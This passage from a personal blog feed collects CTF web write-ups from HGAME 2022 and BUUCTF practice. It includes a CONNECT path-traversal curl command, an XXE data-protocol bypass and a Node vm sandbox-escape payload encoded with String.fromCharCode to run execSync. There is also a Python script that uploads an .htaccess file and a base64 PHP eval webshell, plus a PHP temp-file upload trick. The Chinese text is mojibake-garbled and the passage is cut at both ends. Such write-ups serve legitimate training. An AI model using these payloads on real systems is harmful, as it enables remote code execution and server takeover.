title="ç¬¬å››å‘¨wp"></a>ç¬¬å››å‘¨wp</h1><h2 id="WEB-3"><a href="#WEB-3" class="headerlink" title="WEB"></a>WEB</h2><h3 id="FileSystem"><a href="#FileSystem" class="headerlink" title="FileSystem"></a>FileSystem</h3><p>åˆæ˜¯goè¯­è¨€çš„é¢˜</p><p>å¾ˆæ˜æ˜¾flagåœ¨there may be a flagé‡Œä½†æ˜¯æ²¡æ³•è®¿é—®åˆ°</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220214215644843.png" alt="image-20220214215644843"></p><p>å› ä¸ºæ ¹æ®main.goé‡Œçš„å†…å®¹å¯ä»¥çœ‹åˆ°è¿™ä¸ªè·¯ç”±è¢«å‡ºé¢˜äººåŠ ä¸Šäº†webæœåŠ¡,ä»è€Œä½¿å¾—æˆ‘ä»¬æ²¡æ³•é€šè¿‡ç›´æ¥è®¿é—®<code>/there may be a flag</code>æ¥è·å–æ–‡ä»¶ã€‚è€Œæ˜¯å¾—åˆ°<code>/there may be a flag</code>è·¯ç”±çš„å›æ˜¾ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220214215629146.png" alt="image-20220214215629146"></p><p>è°·æ­Œæ‰¾ä¸€ä¸‹ctfé‡Œå‡ºç°è¿‡çš„goè¯­è¨€æ¼æ´</p><p><a href="https://bycsec.top/2021/02/07/golang%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/">https://bycsec.top/2021/02/07/golang%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220214215905860.png" alt="image-20220214215905860"></p><p>åˆ©ç”¨ç›¸å¯¹è·¯å¾„è®¿é—®</p><p>å¯¹äº CONNECT è¯·æ±‚ï¼Œè·¯å¾„å’Œä¸»æœºä¿æŒä¸å˜ã€‚</p><p>å’Œè¿™é“é¢˜çš„è€ƒç‚¹ä¸€æ¨¡ä¸€æ ·ï¼Œå¯ä»¥ä»¿ç…§å…¶payloadä»¿å†™ä¸€ä¸ª</p><pre class="language-none"><code class="language-none">curl --path-as-is -X CONNECT http:&#x2F;&#x2F;6a87cb1c66.filesystem.hgame.homeboyc.cn&#x2F;main.go&#x2F;..&#x2F;there_may_be_a_flag</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220214215820089.png" alt="image-20220214215820089"></p><h3 id="Comment"><a href="#Comment" class="headerlink" title="Comment*"></a>Comment*</h3><p>è€ƒç‚¹ï¼šxxeæ³¨å…¥</p><p>æºç ï¼š</p><pre class="language-none"><code class="language-none">&lt;?phprequire &#39;.&#x2F;init.php&#39;;require_once &#39;.&#x2F;db.php&#39;;libxml_disable_entity_loader(false);function waf($str): bool &#123;    if (preg_match(&#39;&#x2F;file|glob|http|dict|gopher|php|ftp|ssh|phar&#x2F;i&#39;, $str)) &#123;        return true;    &#125;    return false;&#125;function save() &#123;    if ($_SERVER[&#39;REQUEST_METHOD&#39;] !&#x3D; &#39;POST&#39;) &#123;        echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;wrong method&#39;]);        return;    &#125;    $data &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);    if (waf($data)) &#123;        http_response_code(403);        echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;Hacker!&#39;]);        return;    &#125;    $id &#x3D; $_SESSION[&#39;unique_id&#39;];    $db &#x3D; getDB();    $stmt &#x3D; $db-&gt;prepare(&#39;INSERT INTO comments (sender,content) VALUES (?,?)&#39;);    $stmt-&gt;execute([$id, $data]);    if ($stmt-&gt;rowCount() !&#x3D; 0) &#123;        echo json_encode([&#39;msg&#39; &#x3D;&gt; &#39;success&#39;]);    &#125; else &#123;        http_response_code(500);        echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;failed to create records&#39;]);    &#125;&#125;function parseXML($str) &#123;    $dom &#x3D; new DOMDocument();    try &#123;        $dom-&gt;loadXML($str, LIBXML_NOENT | LIBXML_DTDLOAD);    &#125; catch (Exception $e) &#123;        http_response_code(400);        echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;invalid xml data&#39;]);        die();    &#125;    $attrs &#x3D; simplexml_import_dom($dom);    if (!isset($attrs-&gt;content)) &#123;        http_response_code(400);        echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;content is empty&#39;]);        die();    &#125;    if (waf($attrs-&gt;sender) || waf($attrs-&gt;content)) &#123;        http_response_code(403);        echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;Hacker!&#39;]);        die();    &#125;    if ($attrs-&gt;sender &#x3D;&#x3D; &#39;admin&#39; &amp;&amp; !preg_match(&#39;&#x2F;admin&#x2F;i&#39;, $str)) &#123;        $flag &#x3D; &#39;hgame&#123;xxxxx&#125;&#39;;        $attrs-&gt;content &#x3D; $flag;    &#125;    return $attrs;&#125;function get() &#123;    $id &#x3D; $_SESSION[&#39;unique_id&#39;];    $db &#x3D; getDB();    $stmt &#x3D; $db-&gt;prepare(&#39;SELECT * FROM comments WHERE sender&#x3D;?&#39;);    $stmt-&gt;execute([$id]);    $data &#x3D; $stmt-&gt;fetchAll();    $result &#x3D; [];    foreach ($data as $key &#x3D;&gt; $val) &#123;        array_push($result, parseXML($val[&#39;content&#39;]));    &#125;    echo json_encode($result);&#125;switch ($_GET[&#39;action&#39;]) &#123;    case &#39;get&#39;:        get();        break;    case &#39;add&#39;:        save();        break;    case &#39;info&#39;:        echo json_encode([&#39;unique_id&#39; &#x3D;&gt; $_SESSION[&#39;unique_id&#39;]]);        break;    default:        http_response_code(400);        echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;no such action&#39;]);        break;&#125;</code></pre><p>å…ˆæŠ“ä¸ªåŒ…çœ‹çœ‹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220220230401250.png" alt="image-20220220230401250"></p><p>æŒºæ˜æ˜¾çš„xxe</p><p>ç„¶åå°±è¦æ»¡è¶³è·å–flagçš„æ¡ä»¶</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220220230438960.png" alt="image-20220220230438960"></p><p>è¦æ±‚senderé‡Œæœ‰adminä½†æ˜¯ä¼ å…¥çš„å†…å®¹ä¸è®¸æœ‰admin</p><p>å¯ä»¥å°è¯•dataåè®®</p><p>ï¼ˆæ¯”èµ›çš„æ—¶å€™ä¸çŸ¥é“æ€ä¹ˆæƒ³çš„ä¸€ç›´æƒ³ç»•è¿‡wafè¯»æ–‡ä»¶ã€‚ã€‚ã€‚å¿˜äº†dataåè®®</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220220234723611.png" alt="image-20220220234723611"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220220232831204.png" alt="image-20220220232831204"></p><h3 id="Markdown-Online"><a href="#Markdown-Online" class="headerlink" title="Markdown Online*"></a>Markdown Online*</h3><p>çœ‹ä¸€ä¸‹æºç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220221141602097.png" alt="image-20220221141602097"></p><p>toUpperCase()æ˜¯å°†å°å†™è½¬æ¢ä¸ºå¤§å†™ï¼Œä½†æ˜¯è¿™æ ·ä¹Ÿç»ä¸å¯èƒ½ç»•è¿‡54gkçš„è¿™ä¸ªifåˆ¤æ–­</p><p>åˆ©ç”¨äº†try catchä½†æ˜¯catchå¹¶æ²¡æœ‰returnè¯­å¥ï¼Œä¹Ÿå°±å¯¼è‡´tryä¸­çš„ä»£ç æŠ›å‡ºé”™è¯¯åç»§ç»­å¾€ä¸‹æ‰§è¡Œ</p><p>æ‰€ä»¥å°±è¦æƒ³åŠæ³•è®©req.body.password = req.body.password.toUpperCase()æŠ¥é”™</p><p>å¯¹ req.body.password.toUpperCase() æ­£ç¡®çš„è§£è¯»æ–¹å¼æ˜¯ï¼šè·å– req.body.passwordå¯¹è±¡çš„ toUpperCaseå±æ€§ï¼Œç„¶åæŠŠè¿™ä¸ªå±æ€§å½“ä½œå‡½æ•°æ¥è°ƒç”¨ã€‚å¦‚æœè¿™ä¸ªå±æ€§ä¸æ˜¯å‡½æ•°å¯¹è±¡å°±ä¼šæŠ›å‡ºé”™è¯¯</p><p>æ‰€ä»¥å¯ä»¥ç”¨</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token operator">:</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></code></pre><p>æˆ–</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token operator">:</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string">"length"</span><span class="token operator">:</span> <span class="token number">16</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>éƒ½å¯ä»¥æ»¡è¶³ç¬¬ä¸€ä¸ªifçš„length==16çš„åˆ¤æ–­å¹¶è®©toUpperCase()æŠ¥é”™</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220221143354198.png" alt="image-20220221143354198"></p><p>ç„¶åæˆ‘ä»¬è®¿é—®/md</p><p>åœ¨è¿™éƒ¨åˆ†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220221143602581.png" alt="image-20220221143602581"></p><p>åˆ©ç”¨markdownitåº“ï¼Œå¹¶å¯¹htmlæ ‡ç­¾æ”¯æŒ</p><p>åœ¨æäº¤çš„åœ°æ–¹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220221144119817.png" alt="image-20220221144119817"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220221144044221.png"></p><p>åœ¨ SubmitController é‡Œï¼Œmarkdown-it è§£æå‡ºæ¥çš„ html ä»£ç ä¼šè¢« zombie.js åŠ è½½ï¼Œzobmie.js åœ¨é‡åˆ° JavaScript ä»£ç çš„æ—¶å€™ä¼šå°†å…¶äº¤ç»™ vm è™šæ‹Ÿæœºæ‰§è¡Œ</p><p>è€Œvmæ¨¡å—æ˜¯å­˜åœ¨é€ƒé€¸çš„ï¼Œ JavaScript å¯¹è±¡çš„ç»§æ‰¿æ˜¯é åŸå‹é“¾å®ç°çš„ï¼Œå€ŸåŠ©åŸå‹é“¾å¯è®¿é—®åˆ° vm æ²™ç®±ä»¥å¤–çš„å†…å®¹ï¼Œå®ç° RCE</p><p>ç™¾åº¦æ‰¾ä¸ªvmé€ƒé€¸çš„payload</p><pre class="language-none"><code class="language-none">this.__proto__.constructor.constructor(&#39;return process&#39;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;calc&#39;)</code></pre><p>ç„¶åè¿˜è¦ç»•è¿‡waf</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220221144435975.png" alt="image-20220221144435975"></p><p>åˆ©ç”¨ JavaScript çš„è¯­è¨€ç‰¹æ€§ï¼Œ obj.contructor å¯ä»¥å˜ä¸º obj[&quot;contr&quot;+&quot;uctor&quot;] çš„å½¢å¼ï¼Œ + ä¹Ÿè¢« ban äº†ï¼Œå¯ä»¥ç”¨concatæ‹¼æ¥å­—ç¬¦ä¸²çš„å½¢å¼: obj[&quot;constru&quot;.concat(&quot;ctor&quot;)] this å’Œ process å¯ä»¥ç”¨ eval(&quot;th&quot;+&quot;is&quot;) çš„å½¢å¼ç»•è¿‡ã€‚</p><p>è¿™é‡Œevalå’ŒString.fromCharCodeéƒ½æ²¡è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨è¿™ä¸ªç»•è¿‡</p><pre class="language-python" data-language="python"><code class="language-python">a &#x3D; &quot;document.write(this.__proto__.constructor.constructor(&#39;return process&#39;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;ls &#x2F;&#39;))&quot;b &#x3D; []for i in range(len(a)):    b.append(ord(a[i]))print(b)</code></pre><pre class="language-none"><code class="language-none">&lt;script&gt;eval(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 119, 114, 105, 116, 101, 40, 116, 104, 105, 115, 46, 95, 95, 112, 114, 111, 116, 111, 95, 95, 46, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 46, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 40, 39, 114, 101, 116, 117, 114, 110, 32, 112, 114, 111, 99, 101, 115, 115, 39, 41, 40, 41, 46, 109, 97, 105, 110, 77, 111, 100, 117, 108, 101, 46, 114, 101, 113, 117, 105, 114, 101, 40, 39, 99, 104, 105, 108, 100, 95, 112, 114, 111, 99, 101, 115, 115, 39, 41, 46, 101, 120, 101, 99, 83, 121, 110, 99, 40, 39, 108, 115, 32, 47, 39, 41, 41))&lt;&#x2F;script&gt;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220221150403606.png" alt="image-20220221150403606"></p><p>ç„¶åcat /flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220221150727819.png" alt="image-20220221150727819"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuåˆ·é¢˜è®°å½•(äºŒ)</title>
      <link href="/2022/01/19/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/"/>
      <url>/2022/01/19/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpfunction get_the_flag()&#123;    &#x2F;&#x2F; webadmin will remove your upload file every 20 min!!!!     $userdir &#x3D; &quot;upload&#x2F;tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]);    if(!file_exists($userdir))&#123;    mkdir($userdir);    &#125;    if(!empty($_FILES[&quot;file&quot;]))&#123;        $tmp_name &#x3D; $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];        $name &#x3D; $_FILES[&quot;file&quot;][&quot;name&quot;];        $extension &#x3D; substr($name, strrpos($name,&quot;.&quot;)+1);    if(preg_match(&quot;&#x2F;ph&#x2F;i&quot;,$extension)) die(&quot;^_^&quot;);         if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!&#x3D;&#x3D;False) die(&quot;^_^&quot;);    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;);         $path&#x3D; $userdir.&quot;&#x2F;&quot;.$name;        @move_uploaded_file($tmp_name, $path);        print_r($path);    &#125;&#125;$hhh &#x3D; @$_GET[&#39;_&#39;];if (!$hhh)&#123;    highlight_file(__FILE__);&#125;if(strlen($hhh)&gt;18)&#123;    die(&#39;One inch long, one inch strong!&#39;);&#125;if ( preg_match(&#39;&#x2F;[\x00- 0-9A-Za-z\&#39;&quot;\&#96;~_&amp;.,|&#x3D;[\x7F]+&#x2F;i&#39;, $hhh) )    die(&#39;Try something else!&#39;);$character_type &#x3D; count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);eval($hhh);?&gt;</code></pre><p>å‰åŠæ®µæ˜¯å…³äºæ–‡ä»¶ä¸Šä¼ çš„ä»£ç ï¼ŒååŠæ®µåˆ™æ˜¯æ— æ•°å­—å­—æ¯rceï¼ŒçŒœæ˜¯è¦ä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ä¸Šå»getshell</p><p>ä½†æ˜¯æœ‰ä¸ªéé¢„æœŸè§£ï¼Œåˆ©ç”¨evalå‡½æ•°æŸ¥çœ‹phpinfoå°±èƒ½æ‰¾åˆ°flag</p><pre class="language-none"><code class="language-none">_&#x3D;$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220119190933261.png" alt="image-20220119190933261"></p><p><strong>é¢„æœŸè§£ï¼š</strong></p><p>é¦–å…ˆåˆ©ç”¨evalæ¥æ‰§è¡Œget_the_flagå‡½æ•°</p><pre class="language-none"><code class="language-none">_&#x3D;$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;;&amp;%ff&#x3D;get_the_flag</code></pre><p>å†çœ‹get_the_flagè¿™ä¸ªå‡½æ•°</p><pre class="language-php" data-language="php"><code class="language-php">function get_the_flag()&#123;    &#x2F;&#x2F; webadmin will remove your upload file every 20 min!!!!     $userdir &#x3D; &quot;upload&#x2F;tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]);    if(!file_exists($userdir))&#123;    mkdir($userdir);    &#125;    if(!empty($_FILES[&quot;file&quot;]))&#123;        $tmp_name &#x3D; $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];&#x2F;&#x2F; è¡¨ç¤ºçš„æ˜¯ä¸Šä¼ ä¸´æ—¶æ–‡ä»¶çš„ç»å¯¹è·¯å¾„        $name &#x3D; $_FILES[&quot;file&quot;][&quot;name&quot;];        $extension &#x3D; substr($name, strrpos($name,&quot;.&quot;)+1);&#x2F;&#x2F;å¾—åˆ°åç¼€    if(preg_match(&quot;&#x2F;ph&#x2F;i&quot;,$extension)) die(&quot;^_^&quot;);&#x2F;&#x2F;ç¦æ­¢phçš„æ–‡ä»¶åç¼€        if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!&#x3D;&#x3D;False) die(&quot;^_^&quot;);    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); &#x2F;&#x2F;å›¾ç‰‡åˆ¤æ–­        $path&#x3D; $userdir.&quot;&#x2F;&quot;.$name;        @move_uploaded_file($tmp_name, $path);        print_r($path);    &#125;&#125;</code></pre><p>å¯¹ä¸Šä¼ çš„æ–‡ä»¶å†…å®¹è¿›è¡Œäº†è¿‡æ»¤ï¼Œè¿‡æ»¤äº†phï¼Œ&lt;?ï¼ŒåŒæ—¶è¿˜è¦æ±‚ä¸Šä¼ çš„æ–‡ä»¶æ–‡ä»¶å¤´ä¸ºå›¾ç‰‡ç±»å‹</p><p>æ‰€ä»¥å¯ä»¥å°è¯•ä¸Šä¼ htaccessæ ¼å¼æˆ–è€…user.iniæ ¼å¼çš„æ–‡ä»¶æ¥è§£æå›¾ç‰‡é©¬</p><p>.user.iniæ²¡ç”¨ï¼Œå¯èƒ½æ˜¯å› ä¸ºä¸Šä¼ çš„æ–‡ä»¶å¤¹å†…æ²¡æœ‰æ­£å¸¸çš„phpæ–‡ä»¶</p><p>å·äº†ä¸ªè„šæœ¬</p><pre class="language-python" data-language="python"><code class="language-python">import requestsimport base64htaccess &#x3D; b&quot;&quot;&quot;#define width 1337#define height 1337 AddType application&#x2F;x-httpd-php .sssphp_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;.&#x2F;shell.sss&quot;&quot;&quot;&quot;shell &#x3D; b&quot;GIF89a11&quot; + base64.b64encode(b&quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;)  #GIF89åçš„11æ˜¯ä¸ºäº†æ»¡è¶³base64ç¼–ç url &#x3D; &quot;http:&#x2F;&#x2F;5da5136e-0e89-4d3c-bac5-a2d4f561663b.node4.buuoj.cn:81&#x2F;?_&#x3D;$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;();&amp;%ff&#x3D;get_the_flag&quot;files &#x3D; &#123;&#39;file&#39;:(&#39;.htaccess&#39;,htaccess,&#39;image&#x2F;jpeg&#39;)&#125;data &#x3D; &#123;&quot;upload&quot;:&quot;Submit&quot;&#125;response &#x3D; requests.post(url&#x3D;url, data&#x3D;data, files&#x3D;files)print(response.text)files &#x3D; &#123;&#39;file&#39;:(&#39;shell.sss&#39;,shell,&#39;image&#x2F;jpeg&#39;)&#125;response &#x3D; requests.post(url&#x3D;url, data&#x3D;data, files&#x3D;files)print(response.text)</code></pre><p>è¿™é‡Œå‰åŠæ®µä¼ çš„æ˜¯.htaccessï¼Œå†…å®¹å°±æ˜¯æŠŠ.sssåç¼€çš„æ–‡ä»¶å½“ä½œphpè¿›è¡Œè§£æï¼Œè€Œä¸”è¿˜å¯¹å½“å‰ç›®å½•ä¸‹çš„shell.sssè¿›è¡Œäº†base64è§£ç è¯»å–ã€‚</p><p>åˆ©ç”¨auto_append_fileæ¥åŒ…å«b64è§£ç çš„shell.sssæ–‡ç« ï¼Œè¿™æ ·å¾€shell.sssé‡Œé¢å†™b64è§£å¯†åçš„é©¬ï¼Œå°±å¯ä»¥ç»•è¿‡&lt;?çš„è¿‡æ»¤äº†ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220119194212595.png" alt="image-20220119194212595"></p><p>å¾—åˆ°è·¯å¾„ä¹‹åèšå‰‘è¿ä¸€ä¸‹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220119194354577.png" alt="image-20220119194354577"></p><p>æ ¹ç›®å½•ä¸‹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220119194520905.png" alt="image-20220119194520905"></p><p>ï¼Ÿï¼Ÿä¸ºä»€ä¹ˆæˆ‘èƒ½ç›´æ¥è¯»ï¼Œç™¾åº¦çš„wpéƒ½æ˜¯è¿˜è¦ç»•è¿‡open_basedirçš„</p><p><a href="https://www.e-learn.cn/topic/3627394">æµ…è°ˆå‡ ç§Bypass open_basedirçš„æ–¹æ³• | æ˜“å­¦æ•™ç¨‹ (e-learn.cn)</a></p><p><a href="https://xz.aliyun.com/t/4720">bypass open_basedirçš„æ–°æ–¹æ³• - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220120110108160.png" alt="image-20220120110108160"></p><p>æŠ“åŒ…ï¼ŒæŠŠç»™çš„hashå€¼åˆ©ç”¨getä¼ è¿›å»</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220120110154642.png" alt="image-20220120110154642"></p><p>çœ‹ä¸€ä¸‹flflflflag.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220120110245508.png" alt="image-20220120110245508"></p><p>åˆ©ç”¨ä¼ªåè®®è¯»ä¸€ä¸‹æºç </p><p>file=php://filter/convert.base64-encode/resource=flflflflag.php</p><p>å¾—åˆ°</p><pre class="language-none"><code class="language-none">&lt;html&gt;&lt;head&gt;&lt;script language&#x3D;&quot;javascript&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt;           window.location.href&#x3D;&quot;404.html&quot;;&lt;&#x2F;script&gt;&lt;title&gt;this_is_not_fl4g_and_å‡ºé¢˜äºº_wants_girlfriend&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;&gt;&lt;body&gt;&lt;?php$file&#x3D;$_GET[&#39;file&#39;];if(preg_match(&#39;&#x2F;data|input|zip&#x2F;is&#39;,$file))&#123;die(&#39;nonono&#39;);&#125;@include($file);echo &#39;include($_GET[&quot;file&quot;])&#39;;?&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre><p>index.php</p><pre class="language-none"><code class="language-none">&lt;?phpinclude &#39;config.php&#39;;@$name&#x3D;$_GET[&#39;name&#39;];@$pass&#x3D;$_GET[&#39;pass&#39;];if(md5($secret.$name)&#x3D;&#x3D;&#x3D;$pass)&#123;echo &#39;&lt;script language&#x3D;&quot;javascript&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt;           window.location.href&#x3D;&quot;flflflflag.php&quot;;&lt;&#x2F;script&gt;&#39;;&#125;else&#123;setcookie(&quot;Hash&quot;,md5($secret.$name),time()+3600000);echo &quot;username&#x2F;password error&quot;;&#125;?&gt;&lt;html&gt;&lt;!--md5($secret.$name)&#x3D;&#x3D;&#x3D;$pass --&gt;&lt;&#x2F;html&gt;</code></pre><p>config.phpæœ‰ä¸ªå‡flagã€‚ã€‚ã€‚</p><p>è¿™é“é¢˜æ˜¯è¦åˆ©ç”¨phpä¸´æ—¶æ–‡ä»¶æ¥å†™é©¬ï¼Œæ‰¾åˆ°phpinfoé‡Œçš„flag</p><p><a href="https://www.cnblogs.com/linuxsec/articles/11278477.html">PHPä¸´æ—¶æ–‡ä»¶æœºåˆ¶ä¸åˆ©ç”¨çš„æ€è€ƒ - linuxsec - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://www.cnblogs.com/tr1ple/p/11301743.html">å…³äºphpæ–‡ä»¶æ“ä½œçš„å‡ ä¸ªå°trick - tr1ple - åšå®¢å›­ (cnblogs.com)</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220120114000050.png" alt="image-20220120114000050"></p><p>ä¸´æ—¶æ–‡ä»¶çš„é»˜è®¤å­˜å‚¨ä½ç½®åœ¨tmpç›®å½•ä¸‹ï¼Œæ‰«ç›®å½•æ‰«å‡ºçš„dir.phpæ˜¾ç¤ºäº†tmpç›®å½•ä¸‹çš„æ–‡ä»¶</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220120115533341.png" alt="image-20220120115533341"></p><p>dir.php</p><pre class="language-none"><code class="language-none">&lt;?phpvar_dump(scandir(&#39;&#x2F;tmp&#39;));?&gt;</code></pre><p>åˆ©ç”¨pythonè„šæœ¬ä¸Šä¼ æ–‡ä»¶</p><pre class="language-python" data-language="python"><code class="language-python">import requestsfrom io import BytesIOurl&#x3D;&quot;http:&#x2F;&#x2F;77fd686d-4b45-41a8-81f4-0a199419646a.node4.buuoj.cn:81&#x2F;flflflflag.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&#x2F;&#x2F;ä½¿phpå´©æºƒï¼Œè®©ä¸Šä¼ çš„æ–‡ä»¶ä¿ç•™åœ¨tmpç›®å½•ä¸­payload&#x3D;&quot;&lt;?php phpinfo();?&gt;&quot;files&#x3D;&#123;    &quot;file&quot;:BytesIO(payload.encode())&#125;r&#x3D;requests.post(url&#x3D;url,files&#x3D;files,allow_redirects&#x3D;False)&#x2F;&#x2F;é˜²æ­¢é‡å®šå‘print(r.text)</code></pre><p>å¯ä»¥çœ‹åˆ°ä¸Šä¼ æˆåŠŸ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220120122305671.png" alt="image-20220120122305671"></p><p>å¾—åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220120122643975.png" alt="image-20220120122643975"></p><h2 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220303201348464.png" 